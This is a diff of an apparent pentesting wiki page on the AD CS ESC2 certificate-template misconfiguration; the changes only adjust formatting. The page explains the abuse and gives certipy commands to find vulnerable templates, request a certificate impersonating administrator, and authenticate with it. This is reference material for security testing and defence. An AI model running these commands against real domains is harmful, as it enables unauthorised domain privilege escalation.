@@ -8,7 +8,7 @@ Certificate template has the **Any Purpose** EKU, or **no EKU at all** (potentia
 
 * A template configured with the **Any Purpose** EKU (`OID 2.5.29.37.0`) can be used for literally anything a certificate supports - including Client Authentication (PKINIT) and even acting as a Certificate Request Agent (the same capability abused in ESC3).
 * A template with **no EKU specified at all** is treated by Windows as a **Sub-CA-equivalent** certificate in some validation paths, which historically could also be abused for client authentication or as an enrollment agent, depending on CA/client behavior.
-* If enrollment rights on such a template are available to a low-privileged principal, the attacker effectively has the same options as ESC1 (if `ENROLLEE_SUPPLIES_SUBJECT` is also set) or ESC3 (using the cert as an enrollment agent to request certs *on behalf of* another user).
+* If enrollment rights on such a template are available to a low-privileged principal, the attacker effectively has the same options as ESC1 (if `ENROLLEE_SUPPLIES_SUBJECT` is also set) or ESC3 (using the cert as an enrollment agent to request certs _on behalf of_ another user).
 * In short: ESC2 is rarely exploited standalone - it's a **force multiplier** that upgrades a template into an ESC1 or ESC3 vector.
 
 ## Prerequisites
@@ -20,10 +20,12 @@ Certificate template has the **Any Purpose** EKU, or **no EKU at all** (potentia
 
 {% tabs %}
 {% tab title="Certipy" %}
+{% code lineNumbers="true" %}
 ```bash
 certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 ## Look for templates where "Extended Key Usage" = 'Any Purpose' or is empty, combined with low-priv 'Enrollment Rights'
 ```
+{% endcode %}
 {% endtab %}
 
 {% tab title="Certify" %}
@@ -40,10 +42,12 @@ REM Review 'Enhanced Key Usage' in output for 'Any Purpose' or blank EKU list
 
 {% tabs %}
 {% tab title="Certipy" %}
+{% code lineNumbers="true" %}
 ```bash
 certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <vulnerable-template> -upn administrator@<domain>
 certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
 ```
+{% endcode %}
 {% endtab %}
 
 {% tab title="Certify + Rubeus" %}
